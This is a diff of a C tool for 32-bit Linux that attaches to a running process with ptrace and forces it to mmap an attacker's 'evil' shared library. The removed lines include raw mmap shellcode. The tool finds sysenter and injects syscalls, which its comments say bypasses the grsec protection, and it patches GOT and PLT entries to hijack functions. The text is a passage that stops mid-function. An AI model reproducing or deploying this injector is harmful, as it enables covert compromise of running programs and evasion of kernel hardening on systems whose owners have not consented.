@@ -1,444 +1,413 @@
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <getopt.h>
-#include <sys/types.h>
-#include <sys/ptrace.h>
-#include <sys/mman.h>
-#include <elf.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/stat.h>
-#include <signal.h>
-#include <stdlib.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-#include <sys/syscall.h>
+#include <ctype.h>
 #include <dlfcn.h>
+#include <elf.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/ptrace.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
 
 typedef unsigned char bool;
-#define false 0
-#define true 1
+typedef unsigned long ulong_t;
+typedef unsigned char uchar_t;
 
-#define ERROR(fmt, args...) fprintf(stderr, "ERROR: " fmt "\n", ##args);
-#define ERR_EXIT_FAIL(fmt, args...)  \
-	do { \
-		fprintf(stderr, "ERROR: " fmt "\n", ##args); \
-		exit(EXIT_FAILURE); \
-	} while (0);
+#define false 0;
+#define true  1;
 
-#define ERR_EXIT_SUCC(fmt, args...) \
-	do { \
-		fprintf(stderr, "ERROR: " fmt "\n", ##args); \
-		exit(EXIT_SUCCESS); \
-	} while (0);
+#define MAXBUF 256
 
-#define MAXBUF 255
-#define LIBC "/lib/libc.so.6"
+#ifdef DEBUG_ENABLE
+#define DEBUG(fmt, args...) printf("DEBUG: " fmt "\n", ##args)
+#else
+#define DEBUG 
+#endif
 
-/* memrw() request to modify global offset table */
-#define MODIFY_GOT 1
+#define ERROR(fmt, args...) fprintf(stderr, "ERROR (%s): " fmt "\n", __func__, ##args)
 
-/* memrw() request to patch parasite */
-/* with original function address */
-#define INJECT_TRANSFER_CODE 2
-
-// TODO option
-#define EVILLIB "libparasite.so.0.1"
-#define EVILLIB_FULLPATH "/lib/libparasite.so.0.1"
-
-/* should be getting lib mmap size dynamically */
-/* from map file; this #define is temporary */
-#define LIBSIZE 5472 
-
-/* struct to get symbol relocation info */
-struct linking_info
-{
-        char name[256];
-        int index;
-        int count;
-        uint32_t offset;
+/* symbol relocation info */
+struct sym {
+	int count;
+	char name[MAXBUF];
+	int index;
+	uint32_t offset;
 };
 
-struct segments
+struct sym_info {
+	int count;
+	struct sym syms[0];
+};
+
+/* options for the program */
+struct opts {
+	bool grsec;
+	bool sysenter;
+	// TODO: we should be able to figure this out from ELF header (ET_DYN vs ET_EXEC)
+	bool et_dyn; // proc/pid/maps file differs for PIE binaries
+	int pid;
+	char * func;
+	char * libname;
+};
+
+typedef enum seg_type {
+	TYPE_TEXT = 0,
+	TYPE_DATA = 1,
+} seg_type_t;
+
+struct segment {
+	ulong_t base;
+	ulong_t offset;
+	ulong_t len;
+}; 
+
+// captures information about our parasite library
+struct segments {
+	struct segment segs[2];
+};
+	
+
+static ulong_t original;
+static ulong_t text_base;
+static ulong_t data_base;
+
+// includes shellcode that mmap()s our evil library
+#include "shellcode.h"
+
+// includes byte-based signatures of our evil function and
+// the address we need to patch to transfer back to the 
+// original (innocuous) function (our "transfer code")
+#include "signatures.h"
+
+
+/* copy size bytes from target memory */
+static inline void
+ptrace_cpy_from (ulong_t * dst,
+				 ulong_t src,
+				 size_t size,
+				 int pid)
 {
-    unsigned long text_off;
-    unsigned long text_len;
-    unsigned long data_off;
-    unsigned long data_len;
-} segment;
-unsigned long original;
-extern int getstr;
+	int i;
 
-unsigned long text_base;
-unsigned long data_segment;
-char static_sysenter = 0; 
-
-/*
-_start:
-        jmp B
-A:
-
-        # fd = open("libtest.so.1.0", O_RDONLY);
-
-        xorl %ecx, %ecx
-        movb $5, %al
-        popl %ebx
-        xorl %ecx, %ecx
-        int $0x80
-
-        subl $24, %esp
-
-        # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);
-
-        xorl %edx, %edx
-        movl %edx, (%esp)
-        movl $8192,4(%esp)
-        movl $7, 8(%esp)
-        movl $2, 12(%esp)
-        movl %eax,16(%esp)
-        movl %edx, 20(%esp)
-        movl $90, %eax
-        movl %esp, %ebx
-        int $0x80
-
-        int3
-B:
-        call A
-        .string "/lib/libtest.so.1.0"
-*/
-
-/* make sure to put your shared lib in /lib and name it libtest.so.1.0 */
-static char mmap_shellcode[] = 
-    "\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec"
-        "\x18\x31\xd2\x89\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44"
-        "\x24\x08\x07\x00\x00\x00\xc7\x44\x24\x0c\x02\x00\x00\x00\x89\x44"
-        "\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89\xe3\xcd\x80\xcc"
-        "\xe8\xc0\xff\xff\xff\x2f\x6c\x69\x62\x2f\x6c\x69\x62\x74\x65\x73"
-        "\x74\x2e\x73\x6f\x2e\x31\x2e\x30\x00";
-
-/* the signature for our evil function in our shared object */ 
-/* we use the first 8 bytes of our function code */
-/* make sure this is modified based on your parasite (evil function) */ 
-//unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x38\xc6\x45";
-// TODO: autogen
-static unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x18\xe8\xfc";
-
-/* here is the signature for our transfer code, this will vary */
-/* depending on whether or not you use a function pointer or a */
-/* mov/jmp sequence. The one below is for a function pointer */
-static unsigned char tc[] = "\xc7\x45\xf8\x00";
-
-
-
-unsigned long evil_base;
-
-/*  
- * Our memrw() function serves three purposes
- *    1. modify .got entry with replacement function
- *    2. patch transfer code within replacement function
- *    3. read from any text memory location in process
- */
-static unsigned long 
-memrw (unsigned long *buf, 
-       unsigned long vaddr, 
-       unsigned int size, 
-       int pid, 
-       unsigned long new)
-{
-    int i, j, data;
-
-    /* get the memory address of the function to hijack */
-    if (size == MODIFY_GOT && !buf) {
-	printf("Modifying GOT (%lx)\n", vaddr);
-	original = (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
-	ptrace(PTRACE_POKETEXT, pid, vaddr, new);
-	return (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
-    } else if(size == INJECT_TRANSFER_CODE) { 
-        printf("Injecting %lx at 0x%lx\n", new, vaddr);
-        ptrace(PTRACE_POKETEXT, pid, vaddr, new);
-    
-        j = 0;
-        vaddr--;
-        for (i = 0; i < 2; i++) {
-            data = ptrace(PTRACE_PEEKTEXT, pid, (vaddr + j));
-            buf[i] = data;
-            j += 4;
-        }
-        return 1;
-    } else {
-	printf("Reading from process image at 0x%lx\n", vaddr);
-    }
-
-    for (i = 0, j = 0; i < size; i+= sizeof(uint32_t), j++) {
-	/* PTRACE_PEEK can return -1 on success, check errno */
-	if(((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
-	    return -1;
-	buf[j] = data;
-    }
-
-    return i;
+    for (i = 0; i < (size+sizeof(ulong_t)-1)/sizeof(ulong_t); i++)
+        dst[i] = ptrace(PTRACE_PEEKTEXT, pid, src + i*sizeof(ulong_t));
 }
 
 
-/* bypass grsec patch that prevents code injection into text */
+/* copy size bytes to target memory */
+static inline void
+ptrace_cpy_to (ulong_t dst,
+			   ulong_t * src,
+			   size_t size,
+			   int pid)
+{
+	int i;
+	for (i = 0; i < (size+sizeof(ulong_t)-1) / sizeof(ulong_t); i++) {
+		errno = 0;
+		long ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
+		if (ret == -1 && errno) {
+			ERROR("Ptrace failed (%s)", strerror(errno));
+			return;
+		}
+		
+	}
+}
+
+
+// the transfer code gets us back (via function pointer usually)
+// to the *original* function (the one we're overriding)
 static void
-grsec_mmap_library (int pid)
+inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
 {
-    struct  user_regs_struct reg;
-    long eip, esp, offset, eax, ebx, ecx, edx;
-    int i, status, fd;
-    char library_string[MAXBUF];
-    char orig_ds[MAXBUF];
-    char buf[MAXBUF] = {0};
-    unsigned char tmp[8192];
-    unsigned long sysenter = 0;
-
-    memset(library_string, 0, MAXBUF);
-    strcpy(library_string, EVILLIB_FULLPATH);
-    
-    /* backup first part of data segment which will use for a string and some vars */
-    memrw((unsigned long *)orig_ds, 
-	data_segment, 
-	strlen(library_string)+32, 
-	pid, 
-	0);
-    
-    /* store our string for our evil lib there */
-    for (i = 0; i < strlen(library_string); i += 4) {
-        ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(library_string + i));
-    }
-    
-    /* verify we have the correct string */
-    for (i = 0; i < strlen(library_string); i+= 4) {
-        *(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));
-    }
-    
-    if (strcmp(buf, EVILLIB_FULLPATH) == 0) {
-        printf("Verified string is stored in DS: %s\n", buf);
-    } else {
-        fprintf(stderr, "String was not properly stored in DS: %s\n", buf);
-	exit(EXIT_FAILURE);
-    }
-    
-    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
-
-    wait(NULL);
-
-    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-
-    eax = reg.eax;
-    ebx = reg.ebx;
-    ecx = reg.ecx;
-    edx = reg.edx;
-    eip = reg.eip;
-    esp = reg.esp; 
-    
-    long syscall_eip = reg.eip - 20;
-    
-    /* this gets sysenter dynamically incase its randomized */
-    if (!static_sysenter)
-    {
-            memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
-            for (i = 0; i < 20; i++)
-            {
-                    if (!(i % 10))
-                            printf("\n");
-                     printf("%.2x ", tmp[i]);
-                     if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
-                            sysenter = syscall_eip + i;
-            }
-    }
-    /* this works only if sysenter isn't at random location */
-    else {
-        memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
-        for (i = 0; i < 8192; i++) {
-            if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
-                sysenter = 0xffffe000 + i;
-        }
-    }
-
-    sysenter -= 5;
-
-    if (!sysenter) {
-        printf("Unable to find sysenter\n");
-        exit(EXIT_FAILURE);
-    }
-    printf("Sysenter found: %lx\n", sysenter);   
-    /*
-     sysenter should point to: 
-              push   %ecx
-              push   %edx
-              push   %ebp
-              mov    %esp,%ebp
-              sysenter 
-    */
-
-    ptrace(PTRACE_DETACH, pid, NULL, NULL);
-    wait(0);
-
-    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
-	    perror("ptrace_attach");
-	    exit(EXIT_FAILURE);
-    }
-
-    waitpid(pid, &status, WUNTRACED);
-    
-    reg.eax = SYS_open;
-    reg.ebx = (long)data_segment;
-    reg.ecx = 0;  
-    reg.eip = sysenter;
-    
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
-    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-        
-    for (i = 0; i < 5; i++) {
-        ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
-        wait(NULL);
-        ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-        if (reg.eax != SYS_open)
-            fd = reg.eax;
-    }
-    offset = (data_segment + strlen(library_string)) + 8;
-
-    reg.eip = sysenter;
-    reg.eax = SYS_mmap;
-    reg.ebx = offset;
-
-    ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
-    ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.text_len + (PAGE_SIZE - (segment.text_len & (PAGE_SIZE - 1))));
-    ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ|PROT
-    ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
-    ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
-    ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.text_off & ~(PAGE_SIZE - 1));   
-
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
-    ptrace(PTRACE_GETREGS, pid, NULL, &reg);    
-    
-    for (i = 0; i < 5; i++) {
-	ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
-	wait(NULL);
-	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-        if (reg.eax != SYS_mmap)
-            evil_base = reg.eax;
-    }
-    
-    reg.eip = sysenter;
-    reg.eax = SYS_mmap;
-    reg.ebx = offset;
-
-    ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
-    ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.data_len + (PAGE_SIZE - (segment.data_len & (PAGE_SIZE - 1))));
-    ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ|PROT_WRITE
-    ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
-    ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
-    ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.data_off & ~(PAGE_SIZE - 1));    
-
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
-    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
-
-    for (i = 0; i < 5; i++) {
-	ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
-	wait(NULL);
-    }
-
-    printf("Restoring data segment\n");
-    for (i = 0; i < strlen(library_string) + 32; i++) {
-	ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(orig_ds + i));
-    }
-
-    reg.eip = eip;
-    reg.eax = eax;
-    reg.ebx = ebx;
-    reg.ecx = ecx;
-    reg.edx = edx; 
-    reg.esp = esp;
-
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
-    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+	DEBUG("Injecting %lx at 0x%lx", newval, target_addr);
+	ptrace(PTRACE_POKETEXT, pid, target_addr, newval);
 }
 
 
-/* function to load our evil library */
-static void 
-mmap_library (int pid)
+/* bypasses grsec patch that prevents code injection into text */
+static int 
+grsec_mmap_library (int pid, 
+					char * libname,
+					bool static_sysenter, 
+					ulong_t * evilbase, 
+					struct segments * segs)
 {
-    struct user_regs_struct reg;
-    long eip, esp, offset, 
-	 eax, ebx, ecx, edx;
-    int i, j = 0;
-    unsigned long buf[30];
-    unsigned char saved_text[94];
-    unsigned char *p;
+	struct  user_regs_struct reg;
+	long eip, esp, string, offset, str,
+		 eax, ebx, ecx, edx, orig_eax, data;
+	long syscall_eip;
+	int i, j = 0, ret, status, fd;
+	char library_string[MAXBUF] = {0};
+	char orig_ds[MAXBUF] = {0};
+	char buf[MAXBUF] = {0};
+	unsigned char tmp[8192];
+	ulong_t sysenter = 0;
+
+	snprintf(library_string, MAXBUF, "/lib/%s", libname);
+
+	/* backup first part of data segment which will use for a string and some vars */
+	ptrace_cpy_from((ulong_t*)orig_ds, data_base, strlen(library_string) + 32, pid);
+
+	/* store our string for our evil lib there */
+	ptrace_cpy_to(data_base, (ulong_t*)library_string, strlen(library_string), pid);
+
+	/* verify we have the correct string */
+	ptrace_cpy_from((ulong_t*)buf, data_base, strlen(library_string), pid);
+
+	if (strncmp(buf, library_string, MAXBUF) == 0)
+		DEBUG("Verified string is stored in DS: %s", buf);
+	else {
+		ERROR("String was not properly stored in DS: %s", buf);
+		return -1;
+	}
+
+	// force the target to stop right before it performs a syscall
+	// if it doesn't perform syscalls, we're toast
+	ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
+
+	wait(NULL);
+
+	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+
+	eax = reg.eax;
+	ebx = reg.ebx;
+	ecx = reg.ecx;
+	edx = reg.edx;
+	eip = reg.eip;
+	esp = reg.esp; 
+
+	syscall_eip = reg.eip - 20;
+
+	/*
+	   sysenter should point to this instr sequence: 
+		   push   %ecx
+		   push   %edx
+		   push   %ebp
+		   mov    %esp, %ebp
+		   sysenter 
+	 */
+
+	// We now verify the location of the sysenter instruction
+	if (!static_sysenter) {// this gets sysenter dynamically if its randomized
+	
+		ptrace_cpy_from((ulong_t*)tmp, syscall_eip, 20, pid);
+		for (i = 0; i < 20; i++) {
+			// look for the instr signature of sysenter
+			if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
+				sysenter = syscall_eip + i;
+		}
+	} else {// this works only if sysenter isn't at a random location
+		ptrace_cpy_from((ulong_t*)tmp, 0xffffe000, 8192, pid);
+		for (i = 0; i < 8192; i++) {
+			// look for the instr signature of sysenter
+			if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
+				sysenter = 0xffffe000 + i;
+		}
+	}
+
+	if (!sysenter) {
+		ERROR("Unable to find sysenter\n");
+		return -1;
+	}
+
+	// bump it back to capture the prologue
+	sysenter -= 5;
+
+	DEBUG("Sysenter found: 0x%lx", sysenter);   
+
+	ptrace(PTRACE_DETACH, pid, NULL, NULL);
+	wait(0);
+
+	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
+		ERROR("Could not attach to process");
+		exit(EXIT_FAILURE);
+	}
+
+	waitpid(pid, &status, WUNTRACED);
+
+	// we force an open() of our library path
+	reg.eax = SYS_open;
+	reg.ebx = (long)data_base;
+	reg.ecx = 0;  
+	reg.eip = sysenter;
+
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+
+	// force the pseudo-syscall (by stepping through the syscall instr sequence)
+	for (i = 0; i < 5; i++) {
+		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
+		wait(NULL);
+		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+		if (reg.eax != SYS_open)
+			fd = reg.eax;
+	}
+
+	offset = (data_base + strlen(library_string)) + 8;
+
+	reg.eip = sysenter;
+	reg.eax = SYS_mmap;
+	reg.ebx = offset;
+
+	// we're setting up arguments now to mmap() 
+	ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
+	ptrace(PTRACE_POKETEXT, pid, offset + 4,       // len of our library 
+		   segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));               
+	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ | PROT_EXEC
+	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
+	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd); // fd (we got this back from open)
+	ptrace(PTRACE_POKETEXT, pid, offset + 20,      // offset
+           segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1));  
+
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+	ptrace(PTRACE_GETREGS, pid, NULL, &reg);    
+
+	// force the pseudo-syscall (by stepping through the syscall instr sequence)
+	for(i = 0; i < 5; i++) {
+		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
+		wait(NULL);
+		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+		// we should get back the address of our newly mmap()'d library
+		if (reg.eax != SYS_mmap)
+			*evilbase = reg.eax;
+	}
+
+	reg.eip = sysenter;
+	reg.eax = SYS_mmap;
+	reg.ebx = offset;
+
+	// we mmap() the data segment as well rw- (we won't need this for our attack though)
+	ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
+	ptrace(PTRACE_POKETEXT, pid, offset + 4, segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
+	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ | PROT_WRITE
+	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
+	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd); // fd
+	ptrace(PTRACE_POKETEXT, pid, offset + 20, segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1));    
+
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+
+	// force the pseudo-syscall (by stepping through the syscall instr sequence)
+	for (i = 0; i < 5; i++) {
+		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
+		wait(NULL);
+	}
+
+	DEBUG("Restoring data segment");
+
+	ptrace_cpy_to(data_base, (ulong_t*)orig_ds, strlen(library_string) + 32, pid);
+
+	reg.eip = eip;
+	reg.eax = eax;
+	reg.ebx = ebx;
+	reg.ecx = ecx;
+	reg.edx = edx; 
+	reg.esp = esp;
+
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+	ptrace(PTRACE_DETACH, pid, NULL, NULL);
+
+	return 0;
+}
+
+
+static void
+dump_buf (uchar_t * buf, size_t size)
+{
+	int i;
+    for (i = 0; i < size; i++) {
+        if ((i % 20) == 0)
+            printf("\n");
+        printf("\\x%.2x", buf[i]);
+    }
+    printf("\n");
+}
+
+
+/* 
+ * Injects shellcode to mmap() our library in
+ * the target's .text segment. Newer systems
+ * will not allow this. But we can get around it
+ * by mucking with .data instead (see grsec version)
+ */
+static int 
+mmap_library (int pid, ulong_t * evilbase)
+{
+	struct user_regs_struct reg;
+	long eip, esp, string, offset,
+         eax, ebx, ecx, edx;
+	size_t shellcode_size = sizeof(mmap_shellcode);
+	uchar_t saved_text[shellcode_size];
+	uchar_t buf[shellcode_size];
+    int i, j;
 
     ptrace(PTRACE_GETREGS, pid, NULL, &reg);
 
-    eip = reg.eip;
-    esp = reg.esp;
+	eip = reg.eip;
+	esp = reg.esp;
     eax = reg.eax;
     ebx = reg.ebx;
     ecx = reg.ecx;
     edx = reg.edx;
 
     offset = text_base;
+    
+    DEBUG("%%eip -> 0x%lx", eip);
+    DEBUG("Injecting mmap_shellcode at 0x%lx", offset);
+ 
+	// backup original code before we 
+	// clobber it with shellcode
+	ptrace_cpy_from((ulong_t*)saved_text, offset, shellcode_size, pid);
+    
+	DEBUG("Here is the saved instruction data:");
+#ifdef DEBUG_ENABLE
+	dump_buf(saved_text, shellcode_size);
+#endif
 
-    printf("%%eip -> 0x%lx\n", eip);
-    printf("Injecting mmap_shellcode at 0x%lx\n", offset);
+	// actual code injection
+	ptrace_cpy_to(offset, (ulong_t*)mmap_shellcode, shellcode_size, pid);
+    
+    DEBUG("Verifying shellcode was injected properly, does this look ok?");
 
-    /* were going to load our shellcode at base */
-    /* first we must backup the original code into saved_text */
-    for (i = 0; i < 90; i += 4)
-	buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
+	ptrace_cpy_from((ulong_t*)buf, offset, shellcode_size, pid);
 
-    p = (unsigned char *)buf;
+	dump_buf(buf, shellcode_size);
 
-    memcpy(saved_text, p, 90);
+    DEBUG("Setting %%eip to 0x%lx", offset);
 
-    printf("Here is the saved code we will be overwriting:\n");
-    for (j = 0, i = 0; i < 90; i++) {
-	if ((j++ % 20) == 0)
-	    printf("\n");
-	printf("\\x%.2x", saved_text[i]);
-    }
-    printf("\n");
-
-    /* load shellcode into text starting at eip */
-    for (i = 0; i < 90; i += 4)
-	ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));
-
-    printf("\nVerifying shellcode was injected properly, does this look ok?\n");
-    j = 0;
-
-    for (i = 0; i < 90; i += 4)
-	buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
-
-    p = (unsigned char *) buf;
-    for (j = 0, i = 0; i < 90; i++) {
-	if ((j++ % 20) == 0)
-	    printf("\n");
-	printf("\\x%.2x", p[i]);
-    }
-
-    printf("\n\nSetting %%eip to 0x%lx\n", offset);
-
+	// we now invoke the mmap() shellcode
     reg.eip = offset + 2;
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
     ptrace(PTRACE_CONT, pid, NULL, NULL);
-
+    
     wait(NULL);
-    /* check where eip is now at */ 
+
     ptrace(PTRACE_GETREGS, pid, NULL, &reg);
 
-    printf("%%eip is now at 0x%lx, resetting it to 0x%lx\n", reg.eip, eip);
-    printf("inserting original code back\n");
-
-    for (j = 0, i = 0; i < 90; i += 4)
-	buf[j++] = ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(saved_text + i));
+    DEBUG("%%eip is now at 0x%lx, resetting it to 0x%lx", reg.eip, eip);
+    DEBUG("Restoring original code");
+    
+	ptrace_cpy_to(offset, (ulong_t*)saved_text, shellcode_size, pid);
 
     /* get base addr of our mmap'd lib */
-    evil_base = reg.eax;
-
+    *evilbase = reg.eax;
+	
+	DEBUG("Evilbase is %lx", reg.eax);
+	DEBUG("EBX is %lx", reg.ebx);
+	DEBUG("EDI is %lx", reg.edi);
+	ptrace_cpy_from((ulong_t*)saved_text, reg.ebx, shellcode_size, pid);
+	DEBUG("String there is %s", (char*)saved_text);
+	
+    
     reg.eip = eip;
     reg.eax = eax;
     reg.ebx = ebx;
@@ -446,461 +415,537 @@ mmap_library (int pid)
     reg.edx = edx;
     reg.esp = esp;
 
-    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
-
+	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+    
     if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
-	perror("ptrace_detach");
-	exit(EXIT_FAILURE);
+        ERROR("Could not detach from target");
+        exit(EXIT_FAILURE);
     }
+
+	return 0;
 }
 
-/* this parses/pulls the R_386_JUMP_SLOT relocation entries from our process */
 
-static struct linking_info * 
-get_plt (unsigned char *mem)
+/* this parses the R_386_JUMP_SLOT relocation entries 
+ * from our process 
+ */
+static struct sym_info * 
+get_plt (uchar_t * mem) 
 {
 	Elf32_Ehdr *ehdr;
-	Elf32_Shdr *shdr, *shdrp, *symshdr;
+	Elf32_Shdr *shdr, *shdrp, *strtab;
 	Elf32_Sym *syms, *symsp;
 	Elf32_Rel *rel;
 
-	char *symbol;
-	int i, j, symcount, k;
+	char * symname = NULL;
+	int i, j, k, symcount;
 
-	struct linking_info *link;
+	struct sym_info * sinfo = NULL;
 
-	ehdr = (Elf32_Ehdr *)mem;
-	shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);
+	ehdr = (Elf32_Ehdr*)mem;
+	shdr = (Elf32_Shdr*)(mem + ehdr->e_shoff);
 
 	shdrp = shdr;
 
-	for (i = ehdr->e_shnum; i-- > 0; shdrp++)
-	{
-		if (shdrp->sh_type == SHT_DYNSYM)
-		{
-			symshdr = &shdr[shdrp->sh_link];
-			if ((symbol = malloc(symshdr->sh_size)) == NULL)
-				goto fatal;
-			memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);
+	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {
+
+		// we're looking for the dynamic symbol table here
+		if (shdrp->sh_type == SHT_DYNSYM) {
+
+			// section hdr index of associated string table
+			strtab = &shdr[shdrp->sh_link];
+
+			if ((symname = malloc(strtab->sh_size)) == NULL)
+				return NULL;
+
+			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);
 
 			if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
-				goto fatal;
+				return NULL;
 
-			memcpy((Elf32_Sym *)syms, (Elf32_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
+			memcpy((Elf32_Sym*)syms, (Elf32_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);
+
 			symsp = syms;
 
-			symcount = (shdrp->sh_size / sizeof(Elf32_Sym));
-			link = (struct linking_info *)malloc(sizeof(struct linking_info) * symcount);
-			if (!link)
-				goto fatal;
+			symcount = shdrp->sh_size / sizeof(Elf32_Sym);
 
-			link[0].count = symcount;
-			for (j = 0; j < symcount; j++, symsp++)
-			{
-				strncpy(link[j].name, &symbol[symsp->st_name], sizeof(link[j].name)-1);
-				if (!link[j].name)
-					goto fatal;
-				link[j].index = j;
+			sinfo = (struct sym_info*)malloc(sizeof(struct sym_info) + sizeof(struct sym)*symcount);
+
+			if (!sinfo) {
+				ERROR("Could not allocate symbol info");
+				return NULL;
 			}
+
+			sinfo->count = symcount;
+
+			for (j = 0; j < symcount; j++, symsp++) {
+				strncpy(sinfo->syms[j].name, &symname[symsp->st_name], MAXBUF);
+				sinfo->syms[j].index = j;
+			}
+
+			free(symname);
+			free(syms);
 			break;
 		}
 	}
-	for (i = ehdr->e_shnum; i-- > 0; shdr++)
-	{
-		switch(shdr->sh_type)
-		{
-			case SHT_REL:
-				rel = (Elf32_Rel *)(mem + shdr->sh_offset);
-				for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++)
-				{
-					for (k = 0; k < symcount; k++)
-					{
-						if (ELF32_R_SYM(rel->r_info) == link[k].index)
-							link[k].offset = rel->r_offset;
-					}
-				}
-				break;
-			case SHT_RELA:
-				break;
 
-			default:
-				break;
+	// associate relocation entires with symbols
+	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
+		if (shdr->sh_type == SHT_REL) {
+			rel = (Elf32_Rel*)(mem + shdr->sh_offset);
+			for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
+				for (k = 0; k < symcount; k++) {
+					if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index) 
+						sinfo->syms[k].offset = rel->r_offset;
+				}
+			}
 		}
 	}
 
-	return link;
-fatal:
-	return NULL;
+	return sinfo;
 }
 
 
-static unsigned long 
-search_evil_lib (int pid, unsigned long vaddr)
+static size_t
+get_evil_lib_size (int pid, char * libname) 
 {
-    unsigned char *buf;
-    int i = 0, j = 0, c = 0; 
-    unsigned long evilvaddr = 0;
+	FILE * fd = NULL;
+	char maps[MAXBUF] = {0};
+	char buf[MAXBUF];
 
-    if ((buf = malloc(LIBSIZE)) == NULL)
-    {
-        perror("malloc");
-        exit(-1);
